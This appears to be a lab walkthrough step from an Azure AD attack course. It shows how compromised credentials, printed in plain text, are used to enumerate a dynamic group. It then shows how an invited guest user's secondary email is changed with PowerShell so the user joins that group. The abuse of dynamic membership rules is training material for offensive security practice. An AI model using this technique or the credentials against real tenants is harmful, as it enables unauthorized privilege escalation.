## Objective 22 ***Part of - Kill Chain - 3***

```
- Enumerate Dynamic groups in defcorpit.onmicrosoft.com using privileges of `thomasebarlow@defcorpit.onmicrosoft.com`
- Invite studentx@defcorpextcontractors.onmicrosoft.com as guest user and modify its attributes to join a dynamic group
```
- We compromised credentials for thomasebarlow@defcorpit.onmicrosoft.com from a deployment template.
```
Username - thomasebarlow@defcorpit.onmicrosoft.com
Password - %%^Da@asyu0(@*&48VVf6
```

- Use that to logon to the Azure portal and access the DefCorp IT tenant. A group called ITOPS has Dynamic group
membership

![test](/img/obj22.png "Enumeration")

- Check the rule that adds members to this group. The rule means that any Guest user whose secondary email contains the string 'vendor' will be added to this group
![test](/img/OBJ22A.png "Enumeration")

- The user's profile will be added to the Azure AD as soon as the invite is sent. Open the user's profile and click on (manage) under Invitation accepted.
![test](/img/obj22b.png "Enumeration")

- Connect to Azure AD using credentials of invited users.
```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$password = ConvertTo-SecureString 'Passwordforstudentx' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('studentx@defcorpextcontractors.onmicrosoft.com', $Password)
Connect-AzureAD -Credential $creds -TenantId b6e0615d-2c17-46b3-922c-491c91624acd
```

- ObjectId using the user Thomas by looking at profile of studentx. Remember to replace the UserPrincipalName:
```powershell
 Set-AzureADUser -ObjectId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com -Verbose
 ```
